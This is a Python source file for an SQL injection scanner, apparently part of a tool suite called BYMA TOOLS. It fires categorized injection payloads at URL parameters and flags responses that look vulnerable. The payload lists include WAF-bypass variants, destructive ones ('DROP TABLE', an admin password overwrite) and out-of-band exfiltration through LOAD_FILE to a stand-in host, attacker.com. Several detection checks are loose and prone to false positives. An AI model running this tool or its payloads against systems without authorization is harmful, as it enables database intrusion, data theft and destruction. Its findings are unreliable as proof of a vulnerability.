"""
BYMA TOOLS - Advanced SQL Injection Scanner
Professional SQL injection detection with multiple techniques
"""
import requests
import re
import time
import json
import hashlib
import urllib.parse
import concurrent.futures
from pathlib import Path
from datetime import datetime
from tqdm import tqdm
from core.colors import (
    print_success, print_error, print_warning, print_info,
    print_result, print_section, print_subsection, print_table,
    cprint, Colors, print_separator, Icons, print_vuln_found
)
from core.logger import get_logger
from core.database import get_database


class SQLInjectionScanner:
    """Professional SQL injection scanner with advanced detection"""
    
    def __init__(self):
        self.logger = get_logger()
        self.db = get_database()
        self.vulnerabilities = []
        self.tested_params = 0
        self.target_url = None
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    # SQL Injection Payloads organized by type
    PAYLOADS = {
        'error_based': [
            "'",
            "''",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "') OR ('1'='1' --",
            "1' OR '1'='1' LIMIT 1",
            "1' OR '1'='1' LIMIT 1 --",
            "1'; SELECT 1--",
            "1'; SELECT NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND 1=1 LIMIT 1--",
            "1' AND 1=2 LIMIT 1--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' AND SUBSTRING(VERSION(),1,1)='5'--",
            "1' AND LENGTH(DATABASE())>0--",
            "1' AND ASCII(SUBSTRING(DATABASE(),1,1))>64--",
            "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT 1,2,3--",
            "1' UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
        ],
        
        'blind_boolean': [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND 1=1#",
            "1' AND 1=2#",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' AND SUBSTRING((SELECT DATABASE()),1,1)='a'--",
            "1' AND LENGTH((SELECT DATABASE()))>0--",
            "1' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64--",
            "1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--",
            "1' AND (SELECT LENGTH(GROUP_CONCAT(TABLE_NAME)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())>0--",
            "1' AND (SELECT COUNT(*) FROM mysql.user)>0--",
        ],
        
        'blind_time': [
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "1 AND SLEEP(5)",
            "'; WAITFOR DELAY '0:0:5'--",
            "1; WAITFOR DELAY '0:0:5'--",
            "1' OR SLEEP(5)--",
            "1' OR pg_sleep(5)--",
            "1' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--",
            "1' AND (SELECT SLEEP(5) FROM DUAL WHERE (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))--",
            "1' AND BENCHMARK(5000000,SHA1('test'))--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND IF(1=1,SLEEP(5),0)--",
            "1' AND IF(1=2,SLEEP(5),0)--",
        ],
        
        'union_based': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT 1,2,3--",
            "0 UNION SELECT NULL--",
            "0 UNION SELECT NULL,NULL--",
            "0 UNION SELECT NULL,NULL,NULL--",
            "0 UNION SELECT 1,2,3--",
        ],
        
        'stacked_queries': [
            "'; SELECT 1--",
            "'; SELECT 1;--",
            "1; SELECT 1--",
            "1'; SELECT 1;--",
            "'; SELECT SLEEP(5)--",
            "1'; SELECT SLEEP(5);--",
            "'; DROP TABLE test--",
            "1'; DROP TABLE test;--",
        ],
        
        'out_of_band': [
            "' AND LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\share'))--",
            "' INTO OUTFILE '/tmp/test.txt'--",
            "1' INTO OUTFILE '/tmp/test.txt'--",
            "' AND (SELECT * FROM (SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\share')))a)--",
        ],
        
        'waf_bypass': [
            "' /*!OR*/ '1'='1",
            "' /*!50000OR*/ '1'='1",
            "' OR/**/ '1'='1",
            "' OR%20'1'='1",
            "' OR\t'1'='1",
            "' OR\n'1'='1",
            "' OR\r'1'='1",
            "' OR/**/1=1--",
            "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
            "' %55NION %53ELECT NULL--",
            "' uNiOn SeLeCt NULL--",
            "' unIOn seLeCt NULL--",
            "' UNiON sELECT NULL--",
            "' unioN selecT NULL--",
            "' /*!UNION*/ /*!SELECT*/ NULL--",
            "' %27%20OR%201%3D1--",
            "' OR '1'='1' LIMIT 1 OFFSET 0--",
            "1' AND IF(1=1,1,2)=1--",
            "1' AND (CASE WHEN 1=1 THEN 1 ELSE 2 END)=1--",
        ],
        
        'insert_update': [
            "' OR '1'='1' INSERT INTO users VALUES('admin','pass')--",
            "' OR '1'='1' UPDATE users SET password='hacked' WHERE username='admin'--",
            "1' OR '1'='1' INSERT INTO users VALUES('admin','pass')--",
            "1' OR '1'='1' UPDATE users SET password='hacked' WHERE username='admin'--",
        ],
    }
    
    # Error patterns for different databases
    ERROR_PATTERNS = {
        'MySQL': [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_',
            r'valid MySQL result',
            r'MySqlClient\.',
            r'com\.mysql\.jdbc',
            r'Unclosed quotation mark after the character string',
            r'SQLSTATE\[42000\]',
        ],
        'PostgreSQL': [
            r'PostgreSQL.*ERROR',
            r'Warning.*\Wpg_',
            r'valid PostgreSQL result',
            r'Npgsql\.',
            r'PG::SyntaxError',
            r'org\.postgresql\.util\.PSQLException',
            r'ERROR:\s+syntax error at or near',
        ],
        'MSSQL': [
            r'Driver.*SQL[\-\_\ ]*Server',
            r'OLE DB.*SQL Server',
            r'\bSQL Server[^&lt;&gt;"&quot;]+Driver',
            r'Warning.*mssql_',
            r'\bSQL Server[^&lt;&gt;"&quot;]+[0-9a-fA-F]{8}',
            r'System\.Data\.SqlClient\.SqlException',
            r'Unclosed quotation mark after the character string',
            r'Microsoft SQL Native Client error',
        ],
        'Oracle': [
            r'\bORA-[0-9][0-9][0-9][0-9]',
            r'Oracle error',
            r'Oracle.*Driver',
            r'Warning.*oci_',
            r'Warning.*ora_',
            r'Oracle\.DataAccess',
            r'quoted string not properly terminated',
        ],
        'SQLite': [
            r'SQLite/JDBCDriver',
            r'SQLite\.Exception',
            r'System\.Data\.SQLite\.SQLiteException',
            r'Warning.*sqlite_',
            r'Warning.*SQLite3::',
            r'\[SQLITE_ERROR\]',
            r'SQLite error',
        ],
        'Access': [
            r'Microsoft Access Driver',
            r'Access Database Engine',
            r'JET Database Engine',
            r' OleDb\.',
            r'\.mdb\)',
            r'ODBC Microsoft Access',
        ],
        'IBM DB2': [
            r'Driver.*DB2',
            r'DB2 SQL error',
            r'DB2.*Exception',
            r'IBM DB2 JDBC',
            r'SQLCODE',
        ],
        'Informix': [
            r'Informix ODBC',
            r'Informix.*Driver',
            r'CLI Driver',
        ],
    }
    
    def scan(self, url, threads=10, timeout=10, output=None, mode='comprehensive'):
        """Main SQL injection scan function"""
        self.target_url = url
        self.start_time = datetime.now()
        
        print_section(f"SQL INJECTION SCANNER")
        print()
        
        # Create scan record
        scan_id = self.db.create_scan("sql_injection", url, "vulnerability")
        self.logger.scan_start("sql_injection", url)
        
        try:
            # Parse URL and parameters
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            if not params:
                print_warning("No parameters found in URL")
                print_info("Testing path-based injection...")
                params = {'path': [parsed_url.path]}
            
            print(f"  {Icons.TARGET} {Colors.BCYAN}Target:{Colors.BWHITE}       {url}")
            print(f"  {Icons.INFO} {Colors.BCYAN}Parameters:{Colors.BWHITE}   {len(params)}")
            print(f"  {Icons.INFO} {Colors.BCYAN}Mode:{Colors.BWHITE}         {mode.upper()}")
            print(f"  {Icons.INFO} {Colors.BCYAN}Timeout:{Colors.BWHITE}      {timeout}s")
            print_separator("-", 50)
            print()
            
            # Test each parameter
            for param_name, param_values in params.items():
                param_value = param_values[0] if param_values else ''
                
                print_subsection(f"Testing Parameter: {param_name}")
                
                # Get baseline response
                baseline = self._get_baseline_response(url, param_name, param_value)
                
                if not baseline:
                    print_warning("Could not get baseline response")
                    continue
                
                # Test error-based
                print_info("Testing error-based injection...")
                self._test_error_based(url, param_name, param_value, baseline, timeout)
                
                # Test boolean-based blind
                print_info("Testing boolean-based blind injection...")
                self._test_boolean_blind(url, param_name, param_value, baseline, timeout)
                
                # Test time-based blind
                print_info("Testing time-based blind injection...")
                self._test_time_blind(url, param_name, param_value, baseline, timeout)
                
                # Test UNION-based
                print_info("Testing UNION-based injection...")
                self._test_union_based(url, param_name, param_value, baseline, timeout)
                
                # Test stacked queries
                print_info("Testing stacked queries...")
                self._test_stacked_queries(url, param_name, param_value, baseline, timeout)
                
                # Test WAF bypass (if enabled)
                if mode == 'comprehensive':
                    print_info("Testing WAF bypass techniques...")
                    self._test_waf_bypass(url, param_name, param_value, baseline, timeout)
                
                self.tested_params += 1
            
            # Display results
            self._display_results()
            
            # Save to database
            self._save_to_database(scan_id)
            
            # Update scan status
            self.db.update_scan(scan_id, "completed", len(self.vulnerabilities))
            self.logger.scan_complete("sql_injection", url, len(self.vulnerabilities))
            
            # Save to file if requested
            if output:
                self._save_results(output)
            
            return self.vulnerabilities
        
        except Exception as e:
            self.db.update_scan(scan_id, "failed")
            self.logger.scan_error("sql_injection", url, str(e))
            print_error(f"Scan failed: {e}")
            return []
    
    def _get_baseline_response(self, url, param_name, param_value):
        """Get baseline response for comparison"""
        try:
            # Normal request
            normal_url = url.replace(f"{param_name}={param_value}", f"{param_name}=test_normal")
            response = self.session.get(normal_url, timeout=10, verify=False)
            
            baseline = {
                'status': response.status_code,
                'length': len(response.text),
                'text': response.text[:1000],
                'time': 0,
                'hash': hashlib.md5(response.text.encode()).hexdigest(),
            }
            
            # True condition response
            true_url = url.replace(f"{param_name}={param_value}", f"{param_name}=1' OR '1'='1")
            true_response = self.session.get(true_url, timeout=10, verify=False)
            
            baseline['true_status'] = true_response.status_code
            baseline['true_length'] = len(true_response.text)
            baseline['true_hash'] = hashlib.md5(true_response.text.encode()).hexdigest()
            
            return baseline
        except Exception as e:
            print_warning(f"Baseline error: {e}")
            return None
    
    def _test_error_based(self, url, param_name, param_value, baseline, timeout):
        """Test for error-based SQL injection"""
        for payload in self.PAYLOADS['error_based']:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(payload)}")
                
                start_time = time.time()
                response = self.session.get(test_url, timeout=timeout, verify=False)
                elapsed = time.time() - start_time
                
                # Check for SQL errors
                for db_type, patterns in self.ERROR_PATTERNS.items():
                    for pattern in patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self.vulnerabilities.append({
                                'type': 'Error-based SQL Injection',
                                'parameter': param_name,
                                'payload': payload,
                                'database': db_type,
                                'evidence': response.text[:200],
                                'severity': 'HIGH',
                                'status': response.status_code,
                                'response_time': elapsed,
                            })
                            print_vuln_found(f"Error-based SQL Injection ({db_type})", "HIGH", param_name)
                            return True
                
                # Check for significant changes
                if self._detect_change(baseline, response, elapsed):
                    self.vulnerabilities.append({
                        'type': 'Potential Error-based Injection',
                        'parameter': param_name,
                        'payload': payload,
                        'database': 'Unknown',
                        'evidence': response.text[:200],
                        'severity': 'MEDIUM',
                        'status': response.status_code,
                        'response_time': elapsed,
                    })
                    print_vuln_found("Potential Error-based Injection", "MEDIUM", param_name)
                    return True
                    
            except requests.Timeout:
                pass
            except Exception:
                pass
        
        return False
    
    def _test_boolean_blind(self, url, param_name, param_value, baseline, timeout):
        """Test for boolean-based blind SQL injection"""
        true_payloads = ["' AND '1'='1", "1 AND 1=1", "' AND 1=1--"]
        false_payloads = ["' AND '1'='2", "1 AND 1=2", "' AND 1=2--"]
        
        for true_payload, false_payload in zip(true_payloads, false_payloads):
            try:
                # True condition
                true_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(true_payload)}")
                true_start = time.time()
                true_response = self.session.get(true_url, timeout=timeout, verify=False)
                true_time = time.time() - true_start
                
                # False condition
                false_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(false_payload)}")
                false_start = time.time()
                false_response = self.session.get(false_url, timeout=timeout, verify=False)
                false_time = time.time() - false_start
                
                # Compare responses
                true_hash = hashlib.md5(true_response.text.encode()).hexdigest()
                false_hash = hashlib.md5(false_response.text.encode()).hexdigest()
                
                # If true and false responses are different
                if true_hash != false_hash:
                    if abs(len(true_response.text) - len(false_response.text)) > 50 or \
                       abs(true_time - false_time) > 1:
                        self.vulnerabilities.append({
                            'type': 'Boolean-based Blind SQL Injection',
                            'parameter': param_name,
                            'payload': f"TRUE: {true_payload} / FALSE: {false_payload}",
                            'database': 'Unknown',
                            'evidence': f"True response length: {len(true_response.text)}, False: {len(false_response.text)}",
                            'severity': 'HIGH',
                            'status': true_response.status_code,
                            'response_time': true_time,
                        })
                        print_vuln_found("Boolean-based Blind Injection", "HIGH", param_name)
                        return True
                        
            except requests.Timeout:
                pass
            except Exception:
                pass
        
        return False
    
    def _test_time_blind(self, url, param_name, param_value, baseline, timeout):
        """Test for time-based blind SQL injection"""
        sleep_payloads = [
            ("' AND SLEEP(5)--", 5),
            ("1' AND SLEEP(5)--", 5),
            ("1 AND SLEEP(5)", 5),
            ("'; WAITFOR DELAY '0:0:5'--", 5),
            ("1' AND IF(1=1,SLEEP(3),0)--", 3),
            ("1' AND BENCHMARK(5000000,SHA1('test'))--", 5),
        ]
        
        for payload, expected_delay in sleep_payloads:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(payload)}")
                
                # Get baseline time
                baseline_url = url.replace(f"{param_name}={param_value}", f"{param_name}=1")
                baseline_start = time.time()
                self.session.get(baseline_url, timeout=timeout, verify=False)
                baseline_time = time.time() - baseline_start
                
                # Test payload
                start_time = time.time()
                response = self.session.get(test_url, timeout=timeout + 10, verify=False)
                elapsed = time.time() - start_time
                
                # Check if response time indicates sleep
                if elapsed >= expected_delay - 1 and elapsed > baseline_time + 2:
                    self.vulnerabilities.append({
                        'type': 'Time-based Blind SQL Injection',
                        'parameter': param_name,
                        'payload': payload,
                        'database': 'MySQL/Other',
                        'evidence': f"Response time: {elapsed:.1f}s (expected: {expected_delay}s)",
                        'severity': 'HIGH',
                        'status': response.status_code,
                        'response_time': elapsed,
                    })
                    print_vuln_found("Time-based Blind Injection", "HIGH", param_name)
                    return True
                    
            except requests.Timeout:
                # Timeout could indicate successful sleep
                pass
            except Exception:
                pass
        
        return False
    
    def _test_union_based(self, url, param_name, param_value, baseline, timeout):
        """Test for UNION-based SQL injection"""
        # First, determine number of columns
        column_tests = [
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "' ORDER BY 4--",
            "' ORDER BY 5--",
            "' ORDER BY 6--",
            "' ORDER BY 7--",
            "' ORDER BY 8--",
            "' ORDER BY 9--",
            "' ORDER BY 10--",
        ]
        
        num_columns = 0
        
        for i, payload in enumerate(column_tests, 1):
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(payload)}")
                response = self.session.get(test_url, timeout=timeout, verify=False)
                
                # If no error, we found the number of columns
                if response.status_code == 200 and not self._has_sql_error(response.text):
                    num_columns = i
                    break
            except:
                pass
        
        if num_columns == 0:
            return False
        
        print_info(f"Detected {num_columns} columns")
        
        # Now test UNION injection
        union_payloads = self.PAYLOADS['union_based']
        
        for payload in union_payloads:
            try:
                # Adjust payload for detected columns
                nulls = ','.join(['NULL'] * num_columns)
                test_payload = payload.replace('NULL,NULL,NULL', nulls)
                
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(test_payload)}")
                response = self.session.get(test_url, timeout=timeout, verify=False)
                
                # Check if UNION injection works
                if response.status_code == 200:
                    # Look for injected values in response
                    if re.search(r'union\s+select', response.text, re.IGNORECASE):
                        self.vulnerabilities.append({
                            'type': 'UNION-based SQL Injection',
                            'parameter': param_name,
                            'payload': test_payload,
                            'database': 'Unknown',
                            'evidence': f"UNION SELECT executed with {num_columns} columns",
                            'severity': 'CRITICAL',
                            'status': response.status_code,
                            'response_time': 0,
                        })
                        print_vuln_found("UNION-based Injection", "CRITICAL", param_name)
                        return True
            except:
                pass
        
        return False
    
    def _test_stacked_queries(self, url, param_name, param_value, baseline, timeout):
        """Test for stacked queries SQL injection"""
        for payload in self.PAYLOADS['stacked_queries']:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(payload)}")
                
                start_time = time.time()
                response = self.session.get(test_url, timeout=timeout, verify=False)
                elapsed = time.time() - start_time
                
                # Check if query executed
                if response.status_code == 200 and not self._has_sql_error(response.text):
                    self.vulnerabilities.append({
                        'type': 'Stacked Queries SQL Injection',
                        'parameter': param_name,
                        'payload': payload,
                        'database': 'Unknown',
                        'evidence': 'Query executed without errors',
                        'severity': 'CRITICAL',
                        'status': response.status_code,
                        'response_time': elapsed,
                    })
                    print_vuln_found("Stacked Queries Injection", "CRITICAL", param_name)
                    return True
            except:
                pass
        
        return False
    
    def _test_waf_bypass(self, url, param_name, param_value, baseline, timeout):
        """Test for WAF bypass techniques"""
        for payload in self.PAYLOADS['waf_bypass']:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={urllib.parse.quote(payload)}")
                response = self.session.get(test_url, timeout=timeout, verify=False)
                
                # Check if request went through
                if response.status_code == 200:
                    # Check for WAF indicators
                    waf_indicators = ['403 Forbidden', 'Access Denied', 'Security', 'Blocked']
                    is_blocked = any(indicator.lower() in response.text.lower() for indicator in waf_indicators)
                    
                    if not is_blocked:
                        # Check if we got different response
                        if self._detect_change(baseline, response, 0):
                            self.vulnerabilities.append({
                                'type': 'WAF Bypass SQL Injection',
                                'parameter': param_name,
                                'payload': payload,
                                'database': 'Unknown',
                                'evidence': f"WAF bypass successful with payload",
                                'severity': 'HIGH',
                                'status': response.status_code,
                                'response_time': 0,
                            })
                            print_vuln_found("WAF Bypass Injection", "HIGH", param_name)
                            return True
            except:
                pass
        
        return False
    
    def _detect_change(self, baseline, response, elapsed):
        """Detect significant changes in response"""
        if not baseline:
            return False
        
        # Check status code change
        if response.status_code != baseline.get('status'):
            return True
        
        # Check significant length change
        length_diff = abs(len(response.text) - baseline.get('length', 0))
        if length_diff > 100:
            return True
        
        # Check response time
        if elapsed > 5:
            return True
        
        # Check content hash change
        current_hash = hashlib.md5(response.text.encode()).hexdigest()
        if current_hash != baseline.get('hash'):
            return True
        
        return False
    
    def _has_sql_error(self, text):
        """Check if response contains SQL error"""
        for db_type, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return True
        return False
    
    def _display_results(self):
        """Display scan results"""
        print_section("SQL INJECTION SCAN RESULTS")
        
        if not self.vulnerabilities:
            print_success("No SQL injection vulnerabilities found")
            print_info(f"Tested {self.tested_params} parameters")
            return
        
        # Summary
        elapsed = (datetime.now() - self.start_time).total_seconds()
        
        print(f"\n  {Icons.WARNING} {Colors.BRED}VULNERABILITIES FOUND{Colors.RESET}")
        print_separator("-", 50)
        
        print(f"  {Icons.TARGET} {Colors.BCYAN}Target:{Colors.BWHITE}       {self.target_url}")
        print(f"  {Icons.INFO} {Colors.BCYAN}Vulnerabilities:{Colors.BWHITE} {len(self.vulnerabilities)}")
        print(f"  {Icons.INFO} {Colors.BCYAN}Parameters Tested:{Colors.BWHITE} {self.tested_params}")
        print(f"  {Icons.INFO} {Colors.BCYAN}Time:{Colors.BWHITE}         {elapsed:.1f}s")
        
        print_separator("-", 50)
        print()
        
        # Display each vulnerability
        for i, vuln in enumerate(self.vulnerabilities, 1):
            severity_colors = {
                'CRITICAL': Colors.BRED,
                'HIGH': Colors.RED,
                'MEDIUM': Colors.BYELLOW,
                'LOW': Colors.BCYAN,
            }
            severity_color = severity_colors.get(vuln['severity'], Colors.BWHITE)
            
            print_subsection(f"Vulnerability #{i}")
            print(f"  {Colors.BCYAN}Type:{Colors.BWHITE}       {vuln['type']}")
            print(f"  {Colors.BCYAN}Parameter:{Colors.BWHITE}   {vuln['parameter']}")
            print(f"  {Colors.BCYAN}Severity:{Colors.BWHITE}    {severity_color}{vuln['severity']}")
            print(f"  {Colors.BCYAN}Database:{Colors.BWHITE}    {vuln.get('database', 'Unknown')}")
            print(f"  {Colors.BCYAN}Payload:{Colors.BWHITE}     {vuln['payload'][:80]}...")
            print(f"  {Colors.BCYAN}Evidence:{Colors.BWHITE}    {vuln['evidence'][:80]}...")
            print(f"  {Colors.BCYAN}Status:{Colors.BWHITE}      {vuln['status']}")
            print()
    
    def _save_to_database(self, scan_id):
        """Save vulnerabilities to database"""
        try:
            with self.db._cursor() as cursor:
                for vuln in self.vulnerabilities:
                    cursor.execute("""
                        INSERT INTO vulnerabilities 
                        (scan_id, vuln_type, severity, location, evidence, payload)
                        VALUES (?, ?, ?, ?, ?, ?)
                    """, (
                        scan_id,
                        vuln['type'],
                        vuln['severity'],
                        f"{self.target_url}?{vuln['parameter']}",
                        vuln['evidence'],
                        vuln['payload']
                    ))
        except Exception as e:
            print_warning(f"Could not save to database: {e}")
    
    def _save_results(self, output_file):
        """Save results to JSON file"""
        try:
            output_path = Path(output_file)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            
            results = {
                'target': self.target_url,
                'scan_time': self.start_time.isoformat(),
                'total_vulnerabilities': len(self.vulnerabilities),
                'parameters_tested': self.tested_params,
                'vulnerabilities': self.vulnerabilities
            }
            
            with open(output_path, 'w') as f:
                json.dump(results, f, indent=2)
            
            print_success(f"Results saved to {output_file}")
        except Exception as e:
            print_error(f"Failed to save results: {e}")
